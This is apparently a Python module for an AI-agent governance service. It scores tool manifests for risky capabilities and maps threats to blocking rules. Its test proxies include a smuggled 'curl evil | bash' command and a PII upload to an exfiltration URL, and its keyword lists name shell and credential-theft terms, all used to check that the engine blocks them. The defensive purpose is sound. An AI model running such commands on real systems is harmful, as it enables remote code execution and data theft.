"""Service-side Ω-exposure assessment — powers the public /v1/assess endpoint
(the Day-1 self-serve front door). Self-contained on purpose: the Docker build
context is governance-service/, so this cannot import the .claude/skills tooling.
It mirrors the assess-agent skill's capability detection + threat→Ω mapping
(threat_model_omega ONTOLOGY) verbatim; test_assess.py asserts parity with the
skill's committed reference reports so the two never drift.

Defines NO governance logic and never fabricates coverage: it maps only to rule
names actually present in the live catalog and is fail-closed when uncertain.
"""
from __future__ import annotations

import csv
import io
import json
import re
import time
from typing import Any, Optional

# ── capability detection (mirrors assess-agent skill) ───────────────────────
CAP = {
    "execution": ["shell", "exec", "subprocess", "interpreter", "terminal",
                  "bash", "python_repl", "run_command", "run_code", "command",
                  "code_execution", "arbitrary_code"],
    "external": ["http", "request", "fetch", "url", "webhook", "upload", "api_call",
                 "send_email", "email", "transmit", "publish", "ftp", "post", "outbound",
                 "browse", "send_external", "share_external", "export"],
    "data": ["read", "get", "query", "list", "export", "download", "dump", "record",
             "file", "database", "_db", "secret", "credential", "key", "token", "pii",
             "phi", "patient", "customer", "card", "account", "ssn", "vault"],
    "privilege": ["grant", "role", "permission", "admin", "escalat", "sudo", "acl",
                  "policy", "iam", "mfa", "disable_logging", "disable_audit",
                  "privilege", "superuser", "add_to_group"],
    "funds": ["transfer", "payment", "pay_", "wire", "send_funds", "withdraw",
              "disburse", "settle", "remit", "payout", "trade", "invoice", "send_payment"],
    "delegation": ["delegate", "spawn", "sub_agent", "subagent", "handoff", "hand_off",
                   "dispatch", "invoke_agent", "assign_task", "orchestrat", "route_to",
                   "create_agent"],
    "mutation": ["approve", "override", "bypass", "change", "modify", "update", "delete",
                 "write", "set_", "create", "revoke", "reset", "alter"],
    "onchain": ["mint_token", "approve_token", "sign_transaction", "broadcast_tx",
                "broadcast_transaction", "sign_and_broadcast", "swap_on_dex",
                "execute_swap", "bridge_funds", "add_liquidity", "remove_liquidity",
                "deploy_contract", "deploy_smart_contract", "send_onchain", "stake_tokens"],
    "physical": ["actuate", "actuator", "robotic", "servo_", "valve", "plc_write",
                 "scada_write", "drone", "uav", "throttle", "gripper", "conveyor",
                 "door_lock", "centrifuge", "steering", "robot_arm", "motor_command"],
    "model_integrity": ["fine_tune", "finetune", "training_data", "model_weights",
                        "update_model", "retrain", "system_prompt", "prompt_template",
                        "embedding_store", "vector_index", "modify_model"],
    "resource": ["spawn_many", "unbounded", "infinite_loop", "gpu_cluster", "scale_up",
                 "provision_compute", "autoscale", "fork_bomb", "batch_unbounded",
                 "unlimited_retries"],
    "market": ["place_order", "execute_order", "submit_order", "market_order",
               "limit_order", "short_sell", "leverage_trade", "trade_crypto",
               "autonomous_trade", "place_bet", "open_position"],
    "synthetic_identity": ["deepfake", "voice_clone", "face_swap", "synthesize_voice",
                           "generate_face", "biometric_enroll", "spoof_identity",
                           "impersonate", "clone_voice"],
}
GAP_CLASS = {
    "onchain": ("Irreversible On-Chain Action", "irreversible onchain action"),
    "physical": ("Physical Actuation Harm", "physical actuation"),
    "model_integrity": ("Model / Prompt Integrity", "model manipulation"),
    "resource": ("Resource / Cost Exhaustion", "resource exhaustion"),
    "market": ("Autonomous Market Action", "autonomous trading"),
    "synthetic_identity": ("Synthetic Identity / Deepfake", "deepfake generation"),
}
SENSITIVE = {"credential": "Credential Exfiltration", "secret": "Credential Exfiltration",
             "key": "Credential Exfiltration", "token": "Credential Exfiltration",
             "phi": "PHI Exposure", "patient": "PHI Exposure",
             "card": "Card Data Exposure",
             "pii": "PII / Regulated Data Export", "customer": "PII / Regulated Data Export",
             "ssn": "PII / Regulated Data Export"}
RISK_PHRASE = {
    "Unauthorized Funds Movement": "unauthorized transfer",
    "Credential Exfiltration": "credential theft",
    "PII / Regulated Data Export": "pii export",
    "PHI Exposure": "phi",
    "Card Data Exposure": "card data exposure",
    "External Egress / Data Exfiltration": "data exfiltration",
    "Privilege Escalation": "privilege escalation",
    "Arbitrary Code Execution": "code execution",
    "Cross-Agent Collusion": "cross-agent collusion",
    "Approval / Control Bypass": "approval bypass",
    "State-Transition Abuse": "state transition abuse",
    **{cls: phrase for cls, phrase in GAP_CLASS.values()},
}
DANGER_VERBS = ("delete", "override", "execute", "transfer", "grant", "disable",
                "send", "deploy", "escalate", "bypass")


def _kw_hit(text: str, kw: str) -> bool:
    if "_" in kw:
        return kw in text
    return re.search(r"\b" + re.escape(kw), text) is not None


# ── manifest parsing (text or parsed JSON) ──────────────────────────────────

def _props(d) -> list[str]:
    if isinstance(d, dict):
        return list(d.get("properties", {}).keys()) or list(d.get("json", {}).get("properties", {}).keys())
    return []


def _tool(name, desc="", inputs=None) -> dict:
    return {"name": str(name or "").strip(), "description": str(desc or "").strip(),
            "inputs": inputs or []}


def parse_manifest(payload: Any, fmt_hint: str = "") -> tuple[list[dict], str]:
    """Accept a parsed JSON object/list, or raw text (CSV / Markdown / JSON)."""
    if isinstance(payload, (dict, list)):
        return _parse_json(payload)
    raw = str(payload)
    hint = (fmt_hint or "").lower()
    stripped = raw.lstrip()
    if hint == "csv" or (not stripped.startswith(("{", "[")) and raw.strip()
                         and "," in raw.splitlines()[0] and "name" in raw.splitlines()[0].lower()):
        return _parse_csv(raw), "csv"
    if stripped.startswith(("{", "[")):
        return _parse_json(json.loads(raw))
    if hint in ("md", "markdown") or stripped.startswith(("#", "-", "*", "|")):
        return _parse_md(raw), "markdown"
    try:
        return _parse_json(json.loads(raw))
    except Exception:
        return _parse_md(raw), "markdown"


def _parse_csv(raw: str) -> list[dict]:
    out = []
    for row in csv.DictReader(io.StringIO(raw)):
        low = {(k or "").lower().strip(): v for k, v in row.items()}
        name = low.get("name") or low.get("tool") or low.get("tool_name")
        if name:
            out.append(_tool(name, low.get("description") or low.get("desc", ""),
                             [x.strip() for x in (low.get("inputs", "") or "").split(";") if x.strip()]))
    return out


def _parse_md(raw: str) -> list[dict]:
    out = []
    for line in raw.splitlines():
        m = re.match(r"\s*[-*]\s+`?([a-zA-Z0-9_.\-]+)`?\s*[—:\-]\s*(.*)", line)
        if m:
            out.append(_tool(m.group(1), m.group(2)))
            continue
        m = re.match(r"\s*\|\s*`?([a-zA-Z0-9_.\-]+)`?\s*\|\s*(.*?)\s*\|", line)
        if m and m.group(1).lower() not in ("tool", "name"):
            out.append(_tool(m.group(1), m.group(2)))
    return out


def _parse_json(data) -> tuple[list[dict], str]:
    if isinstance(data, dict) and "toolConfig" in data:
        out = []
        for t in data["toolConfig"].get("tools", []):
            spec = t.get("toolSpec", t)
            out.append(_tool(spec.get("name"), spec.get("description"), _props(spec.get("inputSchema", {}))))
        return out, "bedrock"
    items = data.get("tools", data) if isinstance(data, dict) else data
    if isinstance(items, dict):
        items = [items]
    out, fmt = [], "generic-json"
    for it in items:
        if isinstance(it, str):
            out.append(_tool(it))
            continue
        if not isinstance(it, dict):
            continue
        if "function" in it and isinstance(it["function"], dict):
            fn = it["function"]; fmt = "openai-functions"
            out.append(_tool(fn.get("name"), fn.get("description"), _props(fn.get("parameters", {}))))
        elif "toolSpec" in it:
            sp = it["toolSpec"]; fmt = "bedrock"
            out.append(_tool(sp.get("name"), sp.get("description"), _props(sp.get("inputSchema", {}))))
        elif "inputSchema" in it:
            fmt = "mcp"
            out.append(_tool(it.get("name"), it.get("description"), _props(it["inputSchema"])))
        else:
            inp = _props(it.get("args_schema", {})) or list((it.get("args") or {}).keys())
            if any(k in it for k in ("args_schema", "args")):
                fmt = "langchain"
            out.append(_tool(it.get("name") or it.get("tool"), it.get("description") or it.get("desc"), inp))
    return [t for t in out if t["name"]], fmt


# ── capability + risk inference ─────────────────────────────────────────────

def detect_caps(tool: dict) -> set[str]:
    text = (tool["name"] + " " + tool["description"] + " " + " ".join(tool["inputs"])).lower()
    return {cap for cap, kws in CAP.items() if any(_kw_hit(text, k) for k in kws)}


def risk_classes(tool: dict, caps: set[str]) -> list[str]:
    text = (tool["name"] + " " + tool["description"] + " " + " ".join(tool["inputs"])).lower()
    rc: set[str] = set()
    if "funds" in caps:
        rc.add("Unauthorized Funds Movement")
    if "execution" in caps:
        rc.add("Arbitrary Code Execution")
    if "privilege" in caps:
        rc.add("Privilege Escalation")
    if "delegation" in caps:
        rc.add("Cross-Agent Collusion")
    if "external" in caps and "data" in caps:
        rc.add("External Egress / Data Exfiltration")
        for kw, label in SENSITIVE.items():
            if _kw_hit(text, kw):
                rc.add(label)
    elif "external" in caps:
        rc.add("External Egress / Data Exfiltration")
    if "mutation" in caps and ("privilege" in caps or "funds" in caps or "data" in caps):
        rc.add("Approval / Control Bypass")
        rc.add("State-Transition Abuse")
    for cap, (cls, _phrase) in GAP_CLASS.items():
        if cap in caps:
            rc.add(cls)
    if not rc and any(_kw_hit(text, v) for v in DANGER_VERBS):
        rc.add("State-Transition Abuse")
    return sorted(rc)


# ── threat → Ω mapping (verbatim from threat_model_omega) ────────────────────
REUSABLE = {"approval_spoofing", "role_escalation", "state_transition_abuse",
            "sensitive_egress", "unauthorized_delegation"}
ONTOLOGY: dict[str, list[str]] = {
    "credential theft": ["credential_exfiltration"],
    "credential exfiltration": ["credential_exfiltration"],
    "secret leakage": ["credential_exfiltration", "sensitive_data_egress"],
    "api key": ["credential_exfiltration"],
    "pii export": ["pii_exfiltration", "customer_pii_external", "sensitive_data_egress", "indirect_sensitive_egress"],
    "pii exfiltration": ["pii_exfiltration", "sensitive_data_egress"],
    "personal data leak": ["pii_exfiltration", "customer_pii_external", "sensitive_data_egress"],
    "customer data leak": ["customer_pii_external", "sensitive_data_egress"],
    "phi": ["phi_exposure", "healthcare_phi_egress"],
    "patient data": ["phi_exposure", "healthcare_phi_egress"],
    "health data": ["phi_exposure", "healthcare_phi_egress"],
    "data exfiltration": ["sensitive_data_egress", "indirect_sensitive_egress", "delegated_external_egress", "internal_artifact_leak"],
    "data egress": ["sensitive_data_egress", "indirect_sensitive_egress"],
    "data leak": ["sensitive_data_egress", "internal_artifact_leak"],
    "internal document leak": ["internal_artifact_leak"],
    "unauthorized transfer": ["unauthorized_transfer", "finance_high_value_unverified_transfer", "finance_funds_to_unverified_destination"],
    "fund transfer": ["finance_high_value_unverified_transfer", "finance_funds_to_unverified_destination", "unauthorized_transfer"],
    "wire fraud": ["finance_funds_to_unverified_destination", "finance_payment_rerouting"],
    "payment rerouting": ["finance_payment_rerouting", "finance_destination_change_after_verification"],
    "payment fraud": ["finance_payment_rerouting", "fraud_split_transfer"],
    "structuring": ["structuring_pattern", "fraud_split_transfer"],
    "smurfing": ["structuring_pattern", "fraud_split_transfer"],
    "transaction velocity": ["velocity_anomaly"],
    "synthetic identity": ["synthetic_identity"],
    "guaranteed returns": ["guaranteed_profit"],
    "privilege escalation": ["privilege_escalation", "role_privilege_escalation", "role_escalation", "unauthorized_role_change"],
    "role escalation": ["role_escalation", "role_privilege_escalation", "unauthorized_role_change"],
    "admin grant": ["role_privilege_escalation", "unauthorized_role_change"],
    "approval bypass": ["approval_spoofing", "finance_approval_tampering", "critical_change_after_verification"],
    "approval spoofing": ["approval_spoofing", "finance_approval_tampering"],
    "review bypass": ["approval_spoofing", "critical_change_after_verification"],
    "four eyes bypass": ["approval_spoofing", "finance_approval_tampering"],
    "shell injection": ["shell_injection"],
    "command injection": ["shell_injection"],
    "remote code execution": ["shell_injection", "exec_plus_external_url"],
    "code execution": ["shell_injection"],
    "card data exposure": ["pci_card_exposure", "compliance_regulated_data_export"],
    "pci": ["pci_card_exposure", "compliance_regulated_data_export"],
    "gdpr purpose": ["gdpr_purpose_mismatch"],
    "purpose limitation": ["gdpr_purpose_mismatch"],
    "unencrypted transmission": ["encryption_missing"],
    "missing encryption": ["encryption_missing"],
    "regulated data export": ["compliance_regulated_data_export", "pci_card_exposure", "gdpr_purpose_mismatch"],
    "cross-agent collusion": ["delegated_external_egress", "unauthorized_delegation", "indirect_sensitive_egress"],
    "multi-agent collusion": ["delegated_external_egress", "unauthorized_delegation"],
    "agent collusion": ["delegated_external_egress", "unauthorized_delegation"],
    "collusive exfiltration": ["delegated_external_egress", "indirect_sensitive_egress"],
    "unauthorized delegation": ["unauthorized_delegation", "delegated_external_egress"],
    "untrusted hand-off": ["unauthorized_delegation"],
    "delayed intent": ["abstraction_conceals_funds", "indirect_sensitive_egress", "finance_funds_after_unverified_access"],
    "delayed action": ["abstraction_conceals_funds", "finance_funds_after_unverified_access"],
    "staged exfiltration": ["indirect_sensitive_egress", "abstraction_conceals_funds"],
    "memory poisoning": ["memory_contamination"],
    "memory contamination": ["memory_contamination"],
    "context poisoning": ["memory_contamination", "contextual_drift_unsafe"],
    "state transition abuse": ["state_transition_abuse", "critical_change_after_verification", "finance_destination_change_after_verification"],
    "verify then mutate": ["critical_change_after_verification", "state_transition_abuse"],
    "classified egress": ["defence_classified_artifact_egress", "defence_cross_domain_transfer_unauthorized"],
    "data spillage": ["defence_cross_domain_transfer_unauthorized"],
    "weapons release": ["engagement_without_authorization", "defence_autonomous_engagement"],
    "autonomous engagement": ["defence_autonomous_engagement", "engagement_without_authorization"],
    "sim swap": ["sim_swap_or_port", "telecom"],
    "number port": ["sim_swap_or_port"],
    "lawful intercept": ["lawful_intercept"],
    "grid control": ["grid_control_without_authorization", "energy_grid_setpoint", "energy_control_write"],
    "scada": ["energy_control_write", "energy_protection_relay"],
    "safety interlock": ["safety_interlock", "energy_protection_relay", "manufacturing"],
    "claim fraud": ["insurance_claim_payout_to_unverified_payee", "claim_payout_without_authorization"],
    "benefit fraud": ["government_benefits_without_eligibility", "benefit_or_record_change_without_authorization"],
    "supplier fraud": ["supply_chain", "shipment", "vendor"],
    "self harm": ["self_harm", "crisis", "mental_health", "failure_to_route_crisis"],
    "crisis disclosure": ["failure_to_route_crisis", "false_reassurance_under_crisis"],
}
PARTIAL_INDIRECT = {
    "prompt injection": "Governed indirectly: the injected instruction is not itself a rule, but any "
                        "unsafe action it induces must still produce a trajectory that reaches Ω — that "
                        "action is blocked pre-execution. Recommend pairing with the reusable patterns "
                        "(approval/role/egress/delegation) for the target tools.",
    "jailbreak": "Governed indirectly: a jailbreak only matters if it yields a trajectory that reaches Ω, "
                 "which is blocked. The prompt text itself is out of scope for trajectory governance.",
    "agent manipulation": "Partially governed: coercion/manipulation markers map to recursive-pressure / "
                          "indirect-coercion Ω where present; for general agents, govern the resulting "
                          "actions via the reusable patterns.",
    "hallucination": "Out of scope for pre-execution trajectory governance (a content-quality concern); "
                     "governed only where a hallucinated action reaches a forbidden tool state.",
    "data poisoning": "Partially governed: training-time poisoning is out of scope; run-time memory/context "
                      "poisoning maps to memory_contamination / contextual_drift_unsafe.",
}


def _norm(s: str) -> str:
    return re.sub(r"[^a-z0-9 ]+", " ", s.lower()).strip()


def build_catalog(rules) -> list[dict]:
    """Catalog from the engine's live, loaded rules (exactly what is deployed)."""
    cat, seen = [], set()
    for r in rules:
        if r.name in seen:
            continue
        seen.add(r.name)
        cat.append({"domain": r.domain.value, "name": r.name,
                    "description": getattr(r, "description", "") or ""})
    return cat


def map_threat(threat: str, cat: list[dict]) -> dict:
    t = _norm(threat)
    names = {c["name"] for c in cat}
    for phrase, why in PARTIAL_INDIRECT.items():
        if phrase in t:
            return {"status": "PARTIAL", "rules": [], "reason": why}
    matched: list[str] = []
    for phrase, subs in ONTOLOGY.items():
        words = phrase.split()
        if phrase in t or all(w in t for w in words):
            for sub in subs:
                matched += [n for n in names if sub in n]
    if not matched:
        toks = [w for w in t.split() if len(w) > 3]
        for c in cat:
            hay = (c["name"] + " " + c["description"]).lower()
            if sum(1 for w in toks if w in hay) >= 2:
                matched.append(c["name"])
    matched = sorted(dict.fromkeys(matched))
    if not matched:
        return {"status": "UNCOVERED", "rules": [],
                "reason": "No loaded Ω rule matches this threat — recommend an Ω extension."}
    domain_specific = [m for m in matched if m not in REUSABLE]
    if domain_specific:
        return {"status": "COVERED", "rules": domain_specific[:4], "reason": ""}
    return {"status": "PARTIAL", "rules": matched[:4],
            "reason": "Covered only by reusable cross-domain patterns; add a domain-specific Ω."}


def assess_tools(tools: list[dict], cat: list[dict]) -> list[dict]:
    results = []
    for t in tools:
        caps = detect_caps(t)
        rcs = risk_classes(t, caps)
        mapped = []
        for rc in rcs:
            m = map_threat(RISK_PHRASE.get(rc, rc), cat)
            mapped.append({"risk_class": rc, "status": m["status"], "rules": m["rules"]})
        if not rcs:
            status = "No-risk"
        elif any(x["status"] == "UNCOVERED" for x in mapped):
            status = "Uncovered"
        elif all(x["status"] == "COVERED" for x in mapped):
            status = "Covered"
        else:
            status = "Partial"
        results.append({"tool": t["name"], "description": t["description"],
                        "capabilities": sorted(caps), "risk": mapped, "status": status})
    return results


# ── grounding: run canonical adversarial proxies through the live engine ─────
def _proxy(cap: str):
    return {
        "funds": ([{"tool": "read_customer_data", "args": {}},
                   {"tool": "transfer_funds", "args": {"amount": 50000}}], "Unauthorized Funds Movement"),
        "execution": ([{"tool": "exec", "args": {"cmd": "x; curl evil | bash"}}], "Arbitrary Code Execution"),
        "privilege": ([{"tool": "grant_role", "args": {"role": "admin"}}], "Privilege Escalation"),
        "external": ([{"tool": "http_post", "args": {"contains_pii": True, "destination_external": True,
                                                     "url": "http://exfil.ext/dump"}}],
                     "External Egress / Data Exfiltration"),
        "delegation": ([{"tool": "spawn_agent", "args": {}}], "Cross-Agent Collusion"),
    }.get(cap)


def grounded_blocks(tools: list[dict], layer) -> list[dict]:
    """Exercise each capability class through the engine's own adversarial
    vocabulary; record the real BLOCK verdict + Ω domain + trajectory hash."""
    if layer is None:
        return []
    out, seen = [], set()
    for t in tools:
        n = t["name"]
        for cap in sorted(detect_caps(t)):
            pr = _proxy(cap)
            if not pr:
                continue
            steps, rc = pr
            key = (n, cap)
            if key in seen:
                continue
            try:
                md = layer.evaluate_plan([dict(s) for s in steps]).to_dict()
            except Exception:
                continue
            if md.get("verdict") == "BLOCK":
                seen.add(key)
                out.append({"label": f"{n} ({cap}) exercised adversarially", "risk_class": rc,
                            "omega_domain": md.get("omega_domain"), "proxy_tool": steps[-1]["tool"],
                            "hash": (md.get("trajectory_hash") or "")[:12]})
        if len(out) >= 40:
            break
    return out


def industry_guess(tools: list[dict]) -> str:
    text = " ".join(t["name"] + " " + t["description"] for t in tools).lower()
    for ind, kws in (("digital_assets", ["onchain", "on-chain", "blockchain", "smart contract",
                                          "defi", "dex", "erc20", "erc721", "web3",
                                          "crypto wallet", "decentralized exchange"]),
                     ("robotics", ["actuat", "robot", "drone", "scada", "plc_", "servo"]),
                     ("finance", ["transfer", "payment", "account", "trade"]),
                     ("healthcare", ["patient", "phi", "prescribe", "ehr", "clinical"]),
                     ("cybersecurity", ["shell", "exec", "credential", "soc", "incident"])):
        if any(k in text for k in kws):
            return ind
    return "enterprise"


def commercial(total, governed, uncovered, blocked) -> str:
    return (f"Of your {total} tools, {governed} map to governed Ω domains today, "
            f"{uncovered} require bespoke Ω extensions, and {blocked} high-risk "
            f"trajectories would be blocked before execution.")


def measure_latency(tools: list[dict], layer, target: int = 60) -> Optional[dict]:
    """Measure how fast the engine evaluates THIS agent's trajectories — warm,
    in-process engine compute time (not network round-trip). Uses the canonical
    proxy trajectories for the agent's detected capabilities so the figure
    reflects realistic, full-catalog evaluation. Returns p50/p95/avg/max in ms."""
    if layer is None:
        return None
    trajs: list[list] = []
    caps: set[str] = set()
    for t in tools:
        caps |= detect_caps(t)
    for cap in sorted(caps):
        pr = _proxy(cap)
        if pr:
            trajs.append(pr[0])
    if not trajs:  # no risk-carrying capability → time a benign single step
        trajs = [[{"tool": "read_report", "args": {}}]]
    try:
        for steps in trajs:  # warm-up (JIT caches, rule closures)
            layer.evaluate_plan([dict(s) for s in steps])
        samples: list[float] = []
        i = 0
        while len(samples) < target:
            steps = trajs[i % len(trajs)]
            t0 = time.perf_counter()
            layer.evaluate_plan([dict(s) for s in steps])
            samples.append((time.perf_counter() - t0) * 1000.0)
            i += 1
    except Exception:
        return None
    samples.sort()
    n = len(samples)

    def q(p: float) -> float:
        return round(samples[min(n - 1, int(p * n))], 4)

    return {"unit": "ms", "measured": "engine evaluate_plan, warm (compute only, not round-trip)",
            "samples": n, "p50": q(0.50), "p95": q(0.95),
            "avg": round(sum(samples) / n, 4), "max": round(samples[-1], 4)}


def assess(payload: Any, catalog: list[dict], ground_layer=None,
           fmt_hint: str = "", org: Optional[str] = None) -> dict:
    """Full assessment: parse → infer → map (fail-closed) → ground. Returns the
    JSON report the endpoint serves and the website renders."""
    tools, fmt = parse_manifest(payload, fmt_hint)
    if not tools:
        raise ValueError("no tools parsed from manifest")
    assessed = assess_tools(tools, catalog)
    blocks = grounded_blocks(tools, ground_layer)
    latency = measure_latency(tools, ground_layer)

    risky = [a for a in assessed if a["status"] != "No-risk"]
    covered = [a for a in assessed if a["status"] == "Covered"]
    partial = [a for a in assessed if a["status"] == "Partial"]
    uncovered = [a for a in assessed if a["status"] == "Uncovered"]
    governed = len(covered) + len(partial)
    cov_pct = round(100 * governed / len(risky)) if risky else 100
    ind = industry_guess(tools)

    exposure: dict[str, dict] = {}
    for a in assessed:
        for r in a["risk"]:
            e = exposure.setdefault(r["risk_class"], {"status": set(), "rules": set(), "tools": 0})
            e["status"].add(r["status"]); e["rules"].update(r["rules"]); e["tools"] += 1

    def estat(s):
        return "Covered" if s == {"COVERED"} else ("Uncovered" if "UNCOVERED" in s else "Partial")

    onboard = {"tools": [a["tool"] for a in uncovered] or [f"{ind}_control_action"],
               "assets": ["Sector-critical records"], "regs": ["<applicable regulation>"],
               "threats": sorted({r["risk_class"] for a in (uncovered + partial) for r in a["risk"]
                                  if r["status"] != "COVERED"}) or ["<no uncovered risk>"]}
    return {
        "schema": "morrison-omega-exposure/1",
        "organization": org or "your agent",
        "manifest_format": fmt,
        "catalog_rules": len(catalog),
        "summary": {"tools": len(tools), "risky": len(risky), "covered": len(covered),
                    "partial": len(partial), "uncovered": len(uncovered), "coverage_pct": cov_pct,
                    "verified_blocked_trajectories": len(blocks)},
        "tools": assessed,
        "exposure": {k: {"status": estat(v["status"]), "rules": sorted(v["rules"]), "tools": v["tools"]}
                     for k, v in exposure.items()},
        "grounded_blocks": blocks,
        "latency": latency,
        "industry": ind,
        "onboard_spec": onboard,
        "commercial": commercial(len(tools), governed, len(uncovered), len(blocks)),
    }
